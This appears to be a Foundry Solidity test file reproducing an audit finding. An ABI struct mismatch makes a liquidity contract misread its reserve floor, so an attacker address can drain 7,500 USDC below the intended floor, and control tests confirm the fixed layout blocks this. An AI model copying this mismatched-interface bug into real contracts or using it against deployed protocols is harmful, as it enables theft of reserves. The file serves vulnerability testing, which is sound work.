// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {
    Exploit,
    MiniToken,
    PolicyManager,
    LiquidityWindow,
    LiquidityWindowFixed
} from "./64664-abi-struct-mismatch-in-band-config-spearbit-none-buck-labs-s.sol";

contract AbiStructMismatchBandConfigTest is Test {
    address internal constant ATTACKER = 0x1111111111111111111111111111111111111111;
    uint8 internal constant GREEN_BAND = 0;

    uint256 internal constant TOTAL_SUPPLY = 1_000_000 * 1e6;
    uint256 internal constant CORRECT_FLOOR = (TOTAL_SUPPLY * 100) / 10000; // 10,000 USDC
    uint256 internal constant BUGGY_FLOOR = (TOTAL_SUPPLY * 25) / 10000; //  2,500 USDC
    uint256 internal constant DRAIN_AMOUNT = CORRECT_FLOOR - BUGGY_FLOOR; //  7,500 USDC

    function test_exploit_abiStructMismatch_drainsReservesBelowFloor() public {
        Exploit e = new Exploit();
        e.run();

        // The mismatched struct makes LiquidityWindow read floorBps from PolicyManager's
        // 5th field (deviationThresholdBps = 25) instead of the real floorBps (100).
        assertEq(e.buggyFloorBps(), 25, "misread floor = deviationThresholdBps");
        assertEq(e.correctFloorBps(), 100, "real floor = floorBps");

        // HARM: the refunder over-drained 7,500 USDC (75 bps of supply) of reserves the
        // intended 100 bps floor should have protected.
        assertEq(e.attackerDrained(), DRAIN_AMOUNT, "refunder over-drained reserves");
        assertEq(DRAIN_AMOUNT, 7_500 * 1e6, "over-drain equals 75 bps of supply");

        MiniToken reserve = MiniToken(e.reserveTokenAddr());
        assertEq(reserve.balanceOf(ATTACKER), DRAIN_AMOUNT, "reserve tokens landed at the attacker");

        // Reserves pushed below the intended floor: from 10,000 (100 bps) down to 2,500 (25 bps).
        assertEq(reserve.balanceOf(e.liquidityWindowAddr()), BUGGY_FLOOR, "reserves drained to the 25 bps level");
        assertLt(reserve.balanceOf(e.liquidityWindowAddr()), CORRECT_FLOOR, "reserves below the intended 100 bps floor");

        // Negative control (run inside the exploit): matching layout blocks the same refund.
        assertTrue(e.fixedRefundBlocked(), "fixed variant blocks the below-floor refund");
    }

    function test_control_matchingStruct_blocksRefund_andReadsRealFloor() public {
        MiniToken reserve = new MiniToken("USD Coin", "USDC", 6);
        PolicyManager pm = new PolicyManager();
        LiquidityWindowFixed lwFixed =
            new LiquidityWindowFixed(address(pm), address(reserve), TOTAL_SUPPLY, CORRECT_FLOOR);
        reserve.mint(address(lwFixed), CORRECT_FLOOR);

        // Correct decode: floorBps = 100 (the real reserve floor).
        assertEq(lwFixed.readFloorBps(GREEN_BAND), 100, "fixed reads the real floorBps");

        // The below-floor refund reverts; reserves and attacker balance untouched.
        vm.expectRevert(bytes("below reserve floor"));
        lwFixed.requestRefund(GREEN_BAND, DRAIN_AMOUNT, ATTACKER);
        assertEq(reserve.balanceOf(ATTACKER), 0, "no reserves leaked under the fix");
        assertEq(reserve.balanceOf(address(lwFixed)), CORRECT_FLOOR, "reserves fully protected");
    }

    function test_control_buggyVsFixed_floorReadDiverges() public {
        MiniToken reserve = new MiniToken("USD Coin", "USDC", 6);
        PolicyManager pm = new PolicyManager();
        LiquidityWindow lw = new LiquidityWindow(address(pm), address(reserve), TOTAL_SUPPLY, CORRECT_FLOOR);
        LiquidityWindowFixed lwFixed =
            new LiquidityWindowFixed(address(pm), address(reserve), TOTAL_SUPPLY, CORRECT_FLOOR);

        // Same PolicyManager, same band, same selector `getBandConfig(uint8)` — only the
        // caller's struct layout differs, yet the decoded floorBps diverges 25 vs 100.
        assertEq(lw.readFloorBps(GREEN_BAND), 25, "buggy interface misreads word4 (deviationThresholdBps)");
        assertEq(lwFixed.readFloorBps(GREEN_BAND), 100, "matching interface reads word6 (floorBps)");
    }
}
